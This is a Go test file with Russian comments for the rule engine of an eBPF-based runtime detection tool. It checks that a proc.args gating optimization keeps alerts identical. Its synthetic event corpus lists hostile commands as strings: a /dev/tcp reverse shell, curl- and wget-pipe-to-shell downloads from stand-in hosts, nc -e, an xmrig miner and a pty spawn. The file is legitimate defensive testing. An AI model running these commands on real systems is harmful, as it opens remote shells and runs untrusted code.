package correlator

import (
	"math/rand"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/zugolO/ebpf-guard/pkg/types"
)

func withArgsGate(on bool, f func()) {
	prev := argsGateEnabled
	argsGateEnabled = on
	defer func() { argsGateEnabled = prev }()
	f()
}

// syscall-события с непустым proc.args на всех номерах: правила-«ворота» обязаны по-прежнему срабатывать.
func p3ArgsCorpus() []types.Event {
	rng := rand.New(rand.NewSource(8703))
	args := []string{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "curl http://x.example/a.sh | sh", "nc -e /bin/sh 10.0.0.1 9001",
		"xmrig --donate-level 1 -o stratum+tcp://pool:3333", "chmod 777 /tmp/x", `python3 -c "import pty;pty.spawn('/bin/sh')"`,
		"/bin/sh -c id", "wget -q -O- http://evil | bash", "kubectl get secrets -A", "ls", "x"}
	comms := []string{"nginx", "bash", "python3", "sshd", "curl", "runc", "nc", "xmrig", "systemd", "kthreadd", "apache2", "sh"}
	var evs []types.Event
	for nr := int64(0); nr < 450; nr++ {
		for k := 0; k < 6; k++ {
			e := types.Event{Type: types.EventSyscall, PID: uint32(300 + rng.Intn(40)), PPID: uint32(1 + rng.Intn(3)), UID: uint32(rng.Intn(2) * 1000),
				ProcArgs: args[rng.Intn(len(args))], Syscall: &types.SyscallEvent{Nr: nr, Ret: int64(rng.Intn(3) - 1)}}
			if rng.Intn(4) == 0 {
				e.ProcArgs = ""
			}
			copy(e.Comm[:], comms[rng.Intn(len(comms))])
			copy(e.ParentComm[:], comms[rng.Intn(len(comms))])
			evs = append(evs, e)
		}
	}
	return evs
}

// П3: те же алерты в том же порядке с воротами proc.args и без — корпус G3, корпус с аргументами и дамп (W86_DUMP).
func TestP3_ShippedRulesetSameAlertsWithArgsGate(t *testing.T) {
	var reOff, reOn *RuleEngine
	var rules []Rule
	withArgsGate(false, func() { reOff, rules = loadShipped(t, true) })
	withArgsGate(true, func() { reOn, _ = loadShipped(t, true) })
	require.Greater(t, reOn.dispatch.sysArgsGated, 40, "ворота proc.args обязаны ограничить заметную часть syscall-правил")
	require.Zero(t, reOff.dispatch.sysArgsGated)
	evs := append(dispatchCorpus(t, rules), p3ArgsCorpus()...)
	a, b := orderedAlerts(reOff, evs), orderedAlerts(reOn, evs)
	require.NotEmpty(t, a)
	require.Empty(t, firstDiff(a, b), "выдачи разошлись")
	// корпус с аргументами сам поднимает алерты от «ворот» — иначе тождество пусто
	withArgs := orderedAlerts(reOn, p3ArgsCorpus())
	require.NotEmpty(t, withArgs, "корпус с proc.args не поднял ни одного алерта")
	t.Logf("событий %d, алертов %d, с proc.args %d; правил с воротами %d из %d", len(evs), len(a), len(withArgs), reOn.dispatch.sysArgsGated, reOn.dispatch.sysTotal)
}

// Применяется: на событии с пустым proc.args кандидатов меньше, чем с непустым.
func TestP3_EmptyArgsEventSeesFewerCandidates(t *testing.T) {
	re, _ := loadShipped(t, true)
	e := types.Event{Type: types.EventSyscall, Syscall: &types.SyscallEvent{Nr: 100000 % 450}}
	empty, ok := re.candidateRules(&e)
	require.True(t, ok)
	e.ProcArgs = "bash -c id"
	full, _ := re.candidateRules(&e)
	require.Less(t, len(empty), len(full)*2/3, "ворота proc.args не применяются: %d против %d", len(empty), len(full))
	// порядок исходный в обоих списках
	for _, l := range [][]int32{empty, full} {
		for i := 1; i < len(l); i++ {
			require.Less(t, l[i-1], l[i])
		}
	}
}

// Правило с equals/not_equals/not_in по proc.args, с or-группой и с сэмплером воротами не закрывается.
func TestP3_GateOnlyForSafeOperators(t *testing.T) {
	mk := func(op RuleConditionOperator, group string) Rule {
		r := Rule{ID: "x", EventType: types.EventSyscall, Action: ActionAlert, skipSampler: true}
		c := RuleCondition{Field: "proc.args", Op: op, Values: []string{"a"}}
		c.opCode, c.fieldID = opCodeOf(op), fidProcArgs
		if group == "" {
			r.Condition = c
		} else {
			r.ConditionGroup = &RuleConditionGroup{Operator: group, Conditions: []RuleCondition{c}}
		}
		return r
	}
	for _, op := range []RuleConditionOperator{OpIn, OpPrefix, OpRegex, OpContains, OpSuffix, OpNotPrefix} {
		r := mk(op, "")
		require.True(t, requiresNonEmptyArgs(&r), "op %s на пустой строке даёт false до сравнения", op)
		r = mk(op, "and")
		require.True(t, requiresNonEmptyArgs(&r))
		r = mk(op, "or")
		require.False(t, requiresNonEmptyArgs(&r), "or-группа не ограничивает")
	}
	for _, op := range []RuleConditionOperator{OpEquals, OpNotEquals, OpNotIn} {
		r := mk(op, "")
		require.False(t, requiresNonEmptyArgs(&r), "op %s пустую строку сравнивает", op)
	}
	r := mk(OpIn, "")
	r.skipSampler = false
	require.False(t, requiresNonEmptyArgs(&r), "правило с сэмплером не пропускается")
}
